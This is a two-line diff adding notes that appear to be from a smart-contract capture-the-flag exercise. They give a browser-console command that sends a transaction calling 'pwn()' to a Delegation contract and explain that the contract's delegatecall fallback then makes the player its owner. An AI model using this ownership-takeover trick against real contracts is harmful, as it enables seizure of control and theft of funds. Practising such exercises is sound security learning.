@@ -1,0 +1,2 @@
+Used the console to `await contract.sendTransaction({ data: web3.sha3('pwn()') })`
+Doing this makes me call the Delegation contract itself thereby making me (player) as msg.sender, thereby the owner of the contract
